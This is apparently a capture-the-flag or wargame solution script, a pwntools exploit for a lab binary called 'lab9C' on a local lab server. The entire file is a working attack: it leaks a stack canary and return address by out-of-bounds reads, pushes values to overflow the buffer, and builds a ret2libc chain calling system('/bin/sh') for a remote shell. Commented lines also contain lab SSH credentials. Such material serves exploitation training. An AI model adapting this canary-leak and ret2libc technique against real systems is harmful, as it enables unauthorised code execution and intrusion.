#!/usr/bin/env python3

from pwn import *
from time import sleep
exe = ELF("./lab9C")

context.binary = exe
gdbscript="b *main+374\nb *main+392"
#Debug local:
#context.log_level='debug'
#p=exe.process()
#gdb.attach(p,gdbscript="b *main+374\nb *main+392")
#Debug on server:
#s=ssh(user="lab9C",password="lab09start",host="192.168.1.18",port=22)
#p=s.run("gdb /levels/lab09/lab9C")
#p.recv()
#p.sendline(gdbscript.encode())
#p.sendline(b"r")
p=remote("192.168.1.18",9943)
def leak(index:int):
    p.recv()
    sleep(1)
    p.sendline(b"2")
    sleep(1)
    p.recv()
    sleep(1)
    p.sendline(str(index).encode())
    sleep(1)
    p.recvuntil(b"] = ")
    sleep(1)
    leak_info=p.recvuntil(b'\n').decode().rstrip()
    sleep(1)
    leak_info=int(leak_info)
    if leak_info<0:
        leak_info=-((leak_info-1)^0xffffffff)
    return leak_info
def push(value:int):
    p.recv()
    p.sendline(b"1")
    p.recv()
    p.sendline(str(value).encode())
canary=leak(257)
main_ret=leak(261)
log.info(f"canary: {hex(canary)}")
log.info(f"main_ret: {hex(main_ret)}")
for i in range(260):
        if i==256:
            push(canary)
        else:
            push(0x91)
system=main_ret+157453
binsh=main_ret+1339297
push(system)
sleep(1)
push(0)#ret for system
sleep(1)
push(binsh)#argv[0]
sleep(1)
p.sendline(b"3")
sleep(1)
p.interactive()
